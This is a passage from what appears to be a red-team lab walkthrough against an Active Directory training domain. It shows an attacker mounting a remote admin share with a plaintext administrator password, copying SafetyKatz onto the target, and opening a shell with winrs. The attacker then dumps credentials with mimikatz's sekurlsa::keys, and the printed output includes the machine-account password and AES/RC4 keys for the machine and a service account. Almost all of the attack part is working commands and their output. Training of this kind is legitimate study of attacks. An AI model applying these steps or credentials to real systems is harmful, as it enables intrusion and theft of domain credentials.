# HANDS-ON 9:

```
-Use Invoke-Mimi to extract credentials of interactive logon sessions and service accounts from us-mailmgmt.
```
## Invoke-Mimi

Copy content:
```
PS C:\Windows\system32> net use x: \\us-mailmgmt\C$\Users\Public /user:us-mailmgmt\Administrator "rU2S;SUpb5z]WM"
The command completed successfully.
```
```
PS C:\Windows\system32> echo F | xcopy C:\AD\Tools\SafetyKatz.exe x:\Safetykatz.exe
Does X:\Safetykatz.exe specify a file name
or directory name on the target
(F = file, D = directory)? F
C:\AD\Tools\SafetyKatz.exe
1 File(s) copied
```

Access to target machine:

```
PS C:\Windows\system32> .\winrs.exe -r:us-mailmgmt -u:".\administrator" -p:"rU2S;SUpb5z]WM" cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>cd C:\Users\Public
cd C:\Users\Public

C:\Users\Public>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 88AD-6C8B

 Directory of C:\Users\Public

01/19/2023  10:13 AM    <DIR>          .
01/19/2023  10:13 AM    <DIR>          ..
05/25/2019  02:22 AM    <DIR>          Documents
09/14/2018  11:19 PM    <DIR>          Downloads
11/16/2022  04:28 AM            64,512 Loader.exe
09/14/2018  11:19 PM    <DIR>          Music
09/14/2018  11:19 PM    <DIR>          Pictures
12/23/2022  05:23 PM         1,891,840 Safetykatz.exe
09/14/2018  11:19 PM    <DIR>          Videos
               2 File(s)      1,956,352 bytes
               7 Dir(s)  15,840,600,064 bytes free

```

Execute SafetyKatz.exe and dump credentials:

```
C:\Users\Public>./Safetykatz.exe
./Safetykatz.exe
'.' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Public>.\Safetykatz.exe
.\Safetykatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # -path
ERROR mimikatz_doLocal ; "-path" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

mimikatz # sekurlsa::keys

Authentication Id : 0 ; 483466 (00000000:0007608a)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/27/2022 3:52:48 AM
SID               : S-1-5-90-0-2

         * Username : US-MAILMGMT$
         * Domain   : us.techcorp.local
         * Password : B_m3`Y;Rg:!pB)rM>nGYT7w^0/!CvL1@@+vA%:ajlT7@t@ESSs0*Vmg_9qyrcccQbdG-PLPw*PzNoPu`n$(*$2+O)'\HiL;VD.4N;X0$Qv%r KKNy"a:O]ES
         * Key List :
           aes256_hmac       2a03dcfd67a30b4565690498ebb68db8de3ff27473cc7ad3590fc8f8a27335f5
           aes128_hmac       65c0b72504e134531fe37b3e761b92a0
           rc4_hmac_nt       6e1c353761fff751539e175a8393a941
           rc4_hmac_old      6e1c353761fff751539e175a8393a941
           rc4_md4           6e1c353761fff751539e175a8393a941
           rc4_hmac_nt_exp   6e1c353761fff751539e175a8393a941
           rc4_hmac_old_exp  6e1c353761fff751539e175a8393a941

Authentication Id : 0 ; 108740 (00000000:0001a8c4)
Session           : Service from 0
User Name         : provisioningsvc
Domain            : US
Logon Server      : US-DC
Logon Time        : 12/27/2022 3:52:18 AM
SID               : S-1-5-21-210670787-2521448726-163245708-8602

         * Username : provisioningsvc
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       a573a68973bfe9cbfb8037347397d6ad1aae87673c4f5b4979b57c0b745aee2a
           rc4_hmac_nt       44dea6608c25a85d578d0c2b6f8355c4
           rc4_hmac_old      44dea6608c25a85d578d0c2b6f8355c4
           rc4_md4           44dea6608c25a85d578d0c2b6f8355c4
           rc4_hmac_nt_exp   44dea6608c25a85d578d0c2b6f8355c4
           rc4_hmac_old_exp  44dea6608c25a85d578d0c2b6f8355c4

Authentication Id : 0 ; 49070 (00000000:0000bfae)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/27/2022 3:52:14 AM
SID               : S-1-5-90-0-1

         * Username : US-MAILMGMT$
         * Domain   : us.techcorp.local
         * Password : B_m3`Y;Rg:!pB)rM>nGYT7w^0/!CvL1@@+vA%:ajlT7@t@ESSs0*Vmg_9qyrcccQbdG-PLPw*PzNoPu`n$(*$2+O)'\HiL;VD.4N;X0$Qv%r KKNy"a:O]ES
         * Key List :
           aes256_hmac       2a03dcfd67a30b4565690498ebb68db8de3ff27473cc7ad3590fc8f8a27335f5
           aes128_hmac       65c0b72504e134531fe37b3e761b92a0
           rc4_hmac_nt       6e1c353761fff751539e175a8393a941
           rc4_hmac_old      6e1c353761fff751539e175a8393a941
           rc4_md4           6e1c353761fff751539e175a8393a941
           rc4_hmac_nt_exp   6e1c353761fff751539e175a8393a941
           rc4_hmac_old_exp  6e1c353761fff751539e175a8393a941

Authentication Id : 0 ; 29108 (00000000:000071b4)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/27/2022 3:52:14 AM
SID               : S-1-5-96-0-1

         * Username : US-MAILMGMT$
         * Domain   : us.techcorp.local
         * Password : B_m3`Y;Rg:!pB)rM>nGYT7w^0/!CvL1@@+vA%:ajlT7@t@ESSs0*Vmg_9qyrcccQbdG-PLPw*PzNoPu`n$(*$2+O)'\HiL;VD.4N;X0$Qv%r KKNy"a:O]ES
         * Key List :
           aes256_hmac       2a03dcfd67a30b4565690498ebb68db8de3ff27473cc7ad3590fc8f8a27335f5
           aes128_hmac       65c0b72504e134531fe37b3e761b92a0
           rc4_hmac_nt       6e1c353761fff751539e175a8393a941
           rc4_hmac_old      6e1c353761fff751539e175a8393a941
           rc4_md4           6e1c353761fff751539e175a8393a941
           rc4_hmac_nt_exp   6e1c353761fff751539e175a8393a941
           rc4_hmac_old_exp  6e1c353761fff751539e175a8393a941

Authentication Id : 0 ; 483403 (00000000:0007604b)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/27/2022 3:52:48 AM
SID               : S-1-5-90-0-2

         * Username : US-MAILMGMT$
         * Domain   : us.techcorp.local
         * Password : B_m3`Y;Rg:!pB)rM>nGYT7w^0/!CvL1@@+vA%:ajlT7@t@ESSs0*Vmg_9qyrcccQbdG-PLPw*PzNoPu`n$(*$2+O)'\HiL;VD.4N;X0$Qv%r KKNy"a:O]ES
         * Key List :
           aes256_hmac       2a03dcfd67a30b4565690498ebb68db8de3ff27473cc7ad3590fc8f8a27335f5
           aes128_hmac       65c0b72504e134531fe37b3e761b92a0
           rc4_hmac_nt       6e1c353761fff751539e175a8393a941
           rc4_hmac_old      6e1c353761fff751539e175a8393a941
           rc4_md4           6e1c353761fff751539e175a8393a941
           rc4_hmac_nt_exp   6e1c353761fff751539e175a8393a941
           rc4_hmac_old_exp  6e1c353761fff751539e175a8393a941

Authentication Id : 0 ; 49111 (00000000:0000bfd7)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/27/2022 3:52:14 AM
SID               : S-1-5-90-0-1

         * Username : US-MAILMGMT$
         * Domain   : us.techcorp.local
         * Password : B_m3`Y;Rg:!pB)rM>nGYT7w^0/!CvL1@@+vA%:ajlT7@t@ESSs0*Vmg_9qyrcccQbdG-PLPw*PzNoPu`n$(*$2+O)'\HiL;VD.4N;X0$Qv%r KKNy"a:O]ES
         * Key List :
           aes256_hmac       2a03dcfd67a30b4565690498ebb68db8de3ff27473cc7ad3590fc8f8a27335f5
           aes128_hmac       65c0b72504e134531fe37b3e761b92a0
           rc4_hmac_nt       6e1c353761fff751539e175a8393a941
           rc4_hmac_old      6e1c353761fff751539e175a8393a941
           rc4_md4           6e1c353761fff751539e175a8393a941
           rc4_hmac_nt_exp   6e1c353761fff751539e175a8393a941
           rc4_hmac_old_exp  6e1c353761fff751539e175a8393a941

Authentication Id : 0 ; 29021 (00000000:0000715d)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/27/2022 3:52:14 AM
SID               : S-1-5-96-0-0

         * Username : US-MAILMGMT$
         * Domain   : us.techcorp.local
         * Password : B_m3`Y;Rg:!pB)rM>nGYT7w^0/!CvL1@@+vA%:ajlT7@t@ESSs0*Vmg_9qyrcccQbdG-PLPw*PzNoPu`n$(*$2+O)'\HiL;VD.4N;X0$Qv%r KKNy"a:O]ES
         * Key List :
           aes256_hmac       2a03dcfd67a30b4565690498ebb68db8de3ff27473cc7ad3590fc8f8a27335f5
           aes128_hmac       65c0b72504e134531fe37b3e761b92a0
           rc4_hmac_nt       6e1c353761fff751539e175a8393a941
           rc4_hmac_old      6e1c353761fff751539e175a8393a941
           rc4_md4           6e1c353761fff751539e175a8393a941
           rc4_hmac_nt_exp   6e1c353761fff751539e175a8393a941
           rc4_hmac_old_exp  6e1c353761fff751539e175a8393a941

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : US-MAILMGMT$
Domain            : US
Logon Server      : (null)
Logon Time        : 12/27/2022 3:52:14 AM
SID               : S-1-5-18

         * Username : us-mailmgmt$
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       f12a400718bcdd5fedec676974175e8fc8921c8401ae70ba1f13b4062c874103
           rc4_hmac_nt       6e1c353761fff751539e175a8393a941
           rc4_hmac_old      6e1c353761fff751539e175a8393a941
           rc4_md4           6e1c353761fff751539e175a8393a941
           rc4_hmac_nt_exp   6e1c353761fff751539e175a8393a941
           rc4_hmac_old_exp  6e1c353761fff751539e175a8393a941

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : US-MAILMGMT$
Domain            : US
Logon Server      : (null)
Logon Time        : 12/27/2022 3:52:14 AM
SID               : S-1-5-20

         * Username : us-mailmgmt$
         * Domain   : US.TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       f12a400718bcdd5fedec676974175e8fc8921c8401ae70ba1f13b4062c874103
           rc4_hmac_nt       6e1c353761fff751539e175a8393a941
           rc4_hmac_old      6e1c353761fff751539e175a8393a941
           rc4_md4           6e1c353761fff751539e175a8393a941
           rc4_hmac_nt_exp   6e1c353761fff751539e175a8393a941
           rc4_hmac_old_exp  6e1c353761fff751539e175a8393a941

Authentication Id : 0 ; 481819 (00000000:00075a1b)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/27/2022 3:52:48 AM
SID               : S-1-5-96-0-2

         * Username : US-MAILMGMT$
         * Domain   : us.techcorp.local
         * Password : B_m3`Y;Rg:!pB)rM>nGYT7w^0/!CvL1@@+vA%:ajlT7@t@ESSs0*Vmg_9qyrcccQbdG-PLPw*PzNoPu`n$(*$2+O)'\HiL;VD.4N;X0$Qv%r KKNy"a:O]ES
         * Key List :
           aes256_hmac       2a03dcfd67a30b4565690498ebb68db8de3ff27473cc7ad3590fc8f8a27335f5
           aes128_hmac       65c0b72504e134531fe37b3e761b92a0
           rc4_hmac_nt       6e1c353761fff751539e175a8393a941
           rc4_hmac_old      6e1c353761fff751539e175a8393a941
           rc4_md4           6e1c353761fff751539e175a8393a941
           rc4_hmac_nt_exp   6e1c353761fff751539e175a8393a941
           rc4_hmac_old_exp  6e1c353761fff751539e175a8393a941
```

